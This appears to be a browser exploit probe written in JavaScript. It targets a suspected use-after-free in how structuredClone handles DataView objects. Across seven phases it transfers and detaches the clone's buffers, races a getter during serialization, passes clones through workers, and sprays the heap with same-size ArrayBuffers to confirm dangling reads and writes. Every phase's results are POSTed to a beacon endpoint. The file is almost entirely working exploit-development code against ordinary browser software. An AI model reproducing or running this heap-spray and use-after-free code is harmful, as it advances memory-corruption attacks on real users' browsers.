/* p66-sc3-uaf — DataView structuredClone UAF escalation
 * SC3 showed: cloned DataView fails instanceof but methods work.
 * This means JSType=DataView but prototype chain is wrong.
 * If the odd DV isn't in the buffer's view list, transferring/detaching
 * its backing buffer may leave a dangling pointer → UAF.
 * Beacon prefix: V66U-
 */
(function(){
"use strict";
var RUN_ID = "v66u" + Math.random().toString(36).slice(2,12);
var PREFIX = "V66U-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,600)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press66-SC3 DataView UAF escalation");

/* ====== PHASE 1: Characterize the odd DataView ====== */
function phase1() {
  var buf = new ArrayBuffer(64);
  var dv = new DataView(buf, 8, 32);
  dv.setFloat64(0, Math.PI);
  dv.setUint32(8, 0xDEADBEEF);
  dv.setUint32(12, 0xCAFEBABE);
  dv.setUint32(16, 0x41414141);
  dv.setUint32(20, 0x42424242);

  var clone;
  try { clone = structuredClone(dv); } catch(e) {
    B("P1-FAIL", "clone threw: " + e.message);
    return null;
  }

  var info = {};
  info.instanceof_DV = clone instanceof DataView;
  info.instanceof_AB = clone instanceof ArrayBuffer;
  try { info.toString = Object.prototype.toString.call(clone); } catch(e) { info.toString = "ERR:" + e.message; }
  try { info.constructor = clone.constructor ? clone.constructor.name : "none"; } catch(e) { info.constructor = "ERR"; }
  try { info.proto = Object.getPrototypeOf(clone) === DataView.prototype ? "DV.proto" : "OTHER"; } catch(e) { info.proto = "ERR"; }
  try { info.proto_is_obj = Object.getPrototypeOf(clone) === Object.prototype ? "OBJ.proto" : "no"; } catch(e) {}
  try { info.proto_chain = []; var p = clone; for(var i=0;i<5;i++){p=Object.getPrototypeOf(p);if(!p)break;info.proto_chain.push(p===DataView.prototype?"DV":p===Object.prototype?"Obj":p===ArrayBuffer.prototype?"AB":"?");}} catch(e){}

  // Method tests
  try { info.getF64 = clone.getFloat64(0) === Math.PI; } catch(e) { info.getF64 = "ERR:" + e.message; }
  try { info.getU32 = clone.getUint32(8) === 0xDEADBEEF; } catch(e) { info.getU32 = "ERR:" + e.message; }
  try { info.byteLen = clone.byteLength; } catch(e) { info.byteLen = "ERR"; }
  try { info.byteOff = clone.byteOffset; } catch(e) { info.byteOff = "ERR"; }
  try { info.hasBuf = !!clone.buffer; } catch(e) { info.hasBuf = "ERR"; }
  try { info.bufLen = clone.buffer.byteLength; } catch(e) { info.bufLen = "ERR"; }

  // Is the clone's buffer the same as original?
  try { info.sameBuf = clone.buffer === buf; } catch(e) { info.sameBuf = "ERR"; }

  // Can we set values on clone?
  try { clone.setUint32(24, 0x13371337); info.canWrite = clone.getUint32(24) === 0x13371337; } catch(e) { info.canWrite = "ERR:" + e.message; }

  // ArrayBuffer.isView check
  try { info.isView = ArrayBuffer.isView(clone); } catch(e) { info.isView = "ERR"; }

  B("P1-CHAR", info);
  return { original: buf, clone: clone, info: info };
}

/* ====== PHASE 2: Transfer the clone's buffer, check for dangling view ====== */
function phase2(p1) {
  if (!p1) { B("P2-SKIP", "no P1 result"); return null; }
  var oddDV = p1.clone;
  var oddBuf = oddDV.buffer;

  // Write a marker before transfer
  oddDV.setUint32(0, 0xAAAAAAAA);

  var result = {};
  try {
    // Transfer the odd DV's buffer via structuredClone
    var transferred = structuredClone(oddBuf, { transfer: [oddBuf] });
    result.transferOK = true;
    result.newBufLen = transferred.byteLength;

    // Check if source buffer is detached
    try { result.srcBufLen = oddBuf.byteLength; } catch(e) { result.srcBufLen = "DETACHED:" + e.message; }

    // THE KEY TEST: can the odd DV still read after its buffer was transferred?
    try {
      var val = oddDV.getUint32(0);
      result.DANGLING = true;  // BUG! View reads after buffer transfer!
      result.danglingVal = "0x" + val.toString(16);
      // What did we read? If 0xAAAAAAAA = stale data from freed backing
      result.staleData = val === 0xAAAAAAAA;
    } catch(e) {
      result.DANGLING = false; // View properly detached
      result.detachErr = e.name + ":" + e.message.slice(0,80);
    }

    // Can we write through the dangling view?
    try {
      oddDV.setUint32(0, 0xBBBBBBBB);
      result.DANGLING_WRITE = true; // UAF WRITE!
    } catch(e) {
      result.DANGLING_WRITE = false;
    }

  } catch(e) {
    result.transferOK = false;
    result.transferErr = e.name + ":" + e.message.slice(0,100);

    // Even if transfer failed, try detaching via postMessage to self
    try {
      var mc = new MessageChannel();
      mc.port1.postMessage(oddBuf, [oddBuf]);
      result.pmTransfer = true;
      try {
        var val2 = oddDV.getUint32(0);
        result.DANGLING_PM = true;
        result.pmVal = "0x" + val2.toString(16);
      } catch(e2) {
        result.DANGLING_PM = false;
      }
    } catch(e2) {
      result.pmTransfer = false;
      result.pmErr = e2.message.slice(0,60);
    }
  }

  B("P2-XFER", result);
  return result;
}

/* ====== PHASE 3: Clone DV on a RAB, resize, transfer ====== */
function phase3() {
  var result = {};
  try {
    var rab = new ArrayBuffer(64, { maxByteLength: 256 });
    var dv = new DataView(rab, 0, 32);
    dv.setUint32(0, 0x11111111);
    dv.setUint32(4, 0x22222222);

    var oddDV;
    try { oddDV = structuredClone(dv); } catch(e) {
      B("P3-FAIL", "clone threw: " + e.message);
      return;
    }

    result.cloneOK = true;
    result.oddBufLen = oddDV.buffer.byteLength;
    result.oddBufIsRAB = oddDV.buffer.resizable !== undefined ? oddDV.buffer.resizable : "no-prop";

    // Resize the ORIGINAL rab
    rab.resize(128);
    result.origResized = rab.byteLength;

    // Does odd DV track the resize?
    try { result.oddBufLenAfter = oddDV.buffer.byteLength; } catch(e) { result.oddBufLenAfter = "ERR"; }
    try { result.oddValAfter = "0x" + oddDV.getUint32(0).toString(16); } catch(e) { result.oddValAfter = "ERR:" + e.message; }

    // Transfer the ORIGINAL rab while odd DV exists
    try {
      var xferred = structuredClone(rab, { transfer: [rab] });
      result.origTransferred = true;
      try { result.origDetached = rab.byteLength; } catch(e) { result.origDetached = "DETACHED"; }
    } catch(e) {
      result.origTransferred = false;
    }

    // Can odd DV still read? (Its buffer is independent clone, should be fine)
    try {
      result.oddReadAfterOrigXfer = "0x" + oddDV.getUint32(0).toString(16);
    } catch(e) {
      result.oddReadAfterOrigXfer = "ERR:" + e.message;
    }

    // Now transfer the ODD DV's own buffer
    var oddBuf = oddDV.buffer;
    try {
      structuredClone(oddBuf, { transfer: [oddBuf] });
      result.oddBufXferred = true;
      try {
        var v = oddDV.getUint32(0);
        result.ODD_DANGLING = true; // BUG!
        result.oddDanglingVal = "0x" + v.toString(16);
      } catch(e) {
        result.ODD_DANGLING = false;
      }
    } catch(e) {
      result.oddBufXferred = false;
      result.oddBufXferErr = e.message.slice(0,60);
    }

  } catch(e) {
    result.rabErr = e.message.slice(0,100);
  }
  B("P3-RAB", result);
}

/* ====== PHASE 4: Getter race in structuredClone transfer list ====== */
function phase4() {
  var result = {};
  try {
    var buf = new ArrayBuffer(128);
    var u8 = new Uint8Array(buf);
    for (var i = 0; i < 128; i++) u8[i] = i;

    // Object with a getter that resizes/detaches during serialization
    var rab;
    try { rab = new ArrayBuffer(64, { maxByteLength: 512 }); } catch(e) {
      result.noRAB = true;
      B("P4-RACE", result);
      return;
    }
    var rabView = new Uint8Array(rab);
    for (var j = 0; j < 64; j++) rabView[j] = 0xCC;

    var triggerCount = 0;
    var evil = {
      get x() {
        triggerCount++;
        try { rab.resize(256); } catch(e) {}
        return 42;
      },
      buf: buf
    };

    // Clone evil with rab in transfer list
    try {
      var cloned = structuredClone(evil, { transfer: [rab] });
      result.cloneOK = true;
      result.triggers = triggerCount;
      result.gotX = cloned.x;
      result.gotBuf = cloned.buf ? cloned.buf.byteLength : "none";
    } catch(e) {
      result.cloneOK = false;
      result.cloneErr = e.name + ":" + e.message.slice(0,80);
      result.triggers = triggerCount;
    }

    // Check rab state after
    try { result.rabLen = rab.byteLength; } catch(e) { result.rabLen = "DETACHED"; }

  } catch(e) {
    result.err = e.message.slice(0,100);
  }
  B("P4-RACE", result);
}

/* ====== PHASE 5: Odd DV → Worker postMessage transfer ====== */
function phase5() {
  var result = {};
  try {
    var buf = new ArrayBuffer(64);
    var dv = new DataView(buf, 0, 32);
    dv.setUint32(0, 0xFEEDFACE);
    dv.setUint32(4, 0xDEADC0DE);

    var oddDV = structuredClone(dv);
    result.oddCreated = true;

    // Send odd DV to worker with its buffer in transfer list
    var workerCode = 'self.onmessage=function(e){var r={};try{var d=e.data;r.type=Object.prototype.toString.call(d);r.isDV=d instanceof DataView;r.len=d.byteLength;r.val="0x"+d.getUint32(0).toString(16);r.val2="0x"+d.getUint32(4).toString(16);}catch(x){r.err=x.message;}self.postMessage(r);}';
    var blob = new Blob([workerCode], {type:'application/javascript'});
    var w = new Worker(URL.createObjectURL(blob));

    var timeout = setTimeout(function() {
      result.workerTimeout = true;
      B("P5-WORKER", result);
    }, 3000);

    w.onmessage = function(e) {
      clearTimeout(timeout);
      result.workerReply = e.data;
      // After worker got it, check if oddDV buffer is detached
      try { result.localBufLen = oddDV.buffer.byteLength; } catch(er) { result.localBufLen = "DETACHED"; }
      try { result.localRead = "0x" + oddDV.getUint32(0).toString(16); } catch(er) { result.localRead = "ERR:" + er.message; }
      B("P5-WORKER", result);
      w.terminate();
    };
    w.onerror = function(e) {
      clearTimeout(timeout);
      result.workerErr = e.message;
      B("P5-WORKER", result);
    };

    // Send the odd DV (no transfer — just clone to worker)
    w.postMessage(oddDV);

    // Also try: send with buffer transfer
    setTimeout(function() {
      var buf2 = new ArrayBuffer(32);
      var dv2 = new DataView(buf2, 0, 16);
      dv2.setUint32(0, 0xBAADF00D);
      var oddDV2 = structuredClone(dv2);
      var oddBuf2 = oddDV2.buffer;

      var result2 = {};
      var w2Code = 'self.onmessage=function(e){self.postMessage({got:true,len:e.data.byteLength});}';
      var w2 = new Worker(URL.createObjectURL(new Blob([w2Code],{type:'application/javascript'})));

      w2.onmessage = function(e) {
        result2.workerGot = e.data;
        try {
          var v = oddDV2.getUint32(0);
          result2.DANGLING_AFTER_PM_XFER = true;
          result2.val = "0x" + v.toString(16);
        } catch(er) {
          result2.DANGLING_AFTER_PM_XFER = false;
        }
        B("P5-PMXFER", result2);
        w2.terminate();
      };
      w2.onerror = function() { B("P5-PMXFER", {err:"worker err"}); };

      try {
        w2.postMessage(oddBuf2, [oddBuf2]);
        result2.xferOK = true;
      } catch(e) {
        result2.xferOK = false;
        result2.xferErr = e.message.slice(0,60);
        B("P5-PMXFER", result2);
      }
    }, 1500);

  } catch(e) {
    result.err = e.message.slice(0,100);
    B("P5-WORKER", result);
  }
}

/* ====== PHASE 6: Double-clone escalation & spray ====== */
function phase6() {
  var result = {};
  try {
    var buf = new ArrayBuffer(256);
    var dv = new DataView(buf, 0, 128);
    // Fill with pattern
    for (var i = 0; i < 32; i++) dv.setUint32(i*4, 0x41410000 + i);

    // Clone once → odd DV
    var odd1 = structuredClone(dv);
    result.odd1_isDV = odd1 instanceof DataView;

    // Clone the odd DV again — does the anomaly stack?
    var odd2 = structuredClone(odd1);
    result.odd2_isDV = odd2 instanceof DataView;
    result.odd2_toString = Object.prototype.toString.call(odd2);
    try { result.odd2_val = "0x" + odd2.getUint32(0).toString(16); } catch(e) { result.odd2_val = "ERR:" + e.message; }
    try { result.odd2_proto = Object.getPrototypeOf(odd2) === DataView.prototype ? "DV" : Object.getPrototypeOf(odd2) === Object.prototype ? "Obj" : "?"; } catch(e) {}

    // If odd1 had wrong proto, does odd2's serialization path differ?
    // Try JSON.stringify on the odd objects
    try { result.odd1_json = JSON.stringify(odd1); } catch(e) { result.odd1_json = "ERR:" + e.message; }
    try { result.odd2_json = JSON.stringify(odd2); } catch(e) { result.odd2_json = "ERR:" + e.message; }

    // Test: Uint8Array.prototype.set with odd DV as source
    try {
      var target = new Uint8Array(128);
      // This should fail — set() doesn't accept DataView... but if JSC treats it as a TA...
      Uint8Array.prototype.set.call(target, odd1);
      result.setFromOdd = "OK-len" + target.length;
    } catch(e) {
      result.setFromOdd = e.name + ":" + e.message.slice(0,40);
    }

    // Test: DataView.prototype methods called explicitly on odd object
    try {
      var v = DataView.prototype.getUint32.call(odd1, 0);
      result.explicitCall = "0x" + v.toString(16);
    } catch(e) {
      result.explicitCall = "ERR:" + e.message;
    }

  } catch(e) {
    result.err = e.message.slice(0,100);
  }
  B("P6-DBLCLONE", result);
}

/* ====== PHASE 7: Spray after transfer — UAF proof ====== */
function phase7() {
  var result = {};
  try {
    var SIZE = 64;
    var buf = new ArrayBuffer(SIZE);
    var dv = new DataView(buf, 0, SIZE);
    dv.setUint32(0, 0xAAAAAAAA);
    dv.setUint32(4, 0xBBBBBBBB);

    var oddDV = structuredClone(dv);
    var oddBuf = oddDV.buffer;

    // Pre-read
    result.preVal = "0x" + oddDV.getUint32(0).toString(16);

    // Transfer the odd buffer → frees backing store
    var detached = false;
    try {
      structuredClone(oddBuf, { transfer: [oddBuf] });
      detached = true;
    } catch(e) {
      // Try MessageChannel
      try {
        var mc = new MessageChannel();
        mc.port1.postMessage(oddBuf, [oddBuf]);
        detached = true;
      } catch(e2) {}
    }
    result.detached = detached;

    if (detached) {
      // Spray: allocate many ArrayBuffers of same size to fill the freed slot
      var spray = [];
      var SPRAY_PATTERN = 0xCC;
      for (var i = 0; i < 200; i++) {
        var sb = new ArrayBuffer(SIZE);
        var sv = new Uint8Array(sb);
        for (var j = 0; j < SIZE; j++) sv[j] = SPRAY_PATTERN;
        spray.push(sb);
      }

      // Read through the (potentially) dangling view
      try {
        var postVal = oddDV.getUint32(0);
        result.POST_DETACH_READ = true;
        result.postVal = "0x" + postVal.toString(16);
        // If we read 0xCCCCCCCC = spray hit = UAF CONFIRMED
        result.SPRAY_HIT = postVal === 0xCCCCCCCC;
        // Read more values
        result.postVal4 = "0x" + oddDV.getUint32(4).toString(16);
        result.postVal8 = "0x" + oddDV.getUint32(8).toString(16);
      } catch(e) {
        result.POST_DETACH_READ = false;
        result.readErr = e.name + ":" + e.message.slice(0,60);
      }

      // Try to write through dangling view
      try {
        oddDV.setUint32(0, 0xDDDDDDDD);
        result.POST_DETACH_WRITE = true;
        // Verify write stuck by reading back
        try { result.writeVerify = "0x" + oddDV.getUint32(0).toString(16); } catch(e) {}
        // Check if any spray buffer was corrupted
        for (var k = 0; k < spray.length; k++) {
          var check = new Uint32Array(spray[k]);
          if (check[0] === 0xDDDDDDDD) {
            result.UAF_WRITE_CONFIRMED = true;
            result.hitIdx = k;
            break;
          }
        }
      } catch(e) {
        result.POST_DETACH_WRITE = false;
      }
    }

  } catch(e) {
    result.err = e.message.slice(0,100);
  }
  B("P7-SPRAY", result);
}

/* ====== Run all phases ====== */
try {
  var p1 = phase1();
  setTimeout(function(){ phase2(p1); }, 100);
  setTimeout(function(){ phase3(); }, 300);
  setTimeout(function(){ phase4(); }, 500);
  setTimeout(function(){ phase5(); }, 700);
  setTimeout(function(){ phase6(); }, 1200);
  setTimeout(function(){ phase7(); }, 1600);
} catch(e) {
  B("FATAL", String(e).slice(0,200));
}

/* heartbeat */
var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){
  clearInterval(hbI);
  B("Z2","probe66-done");
}, 18000);
})();
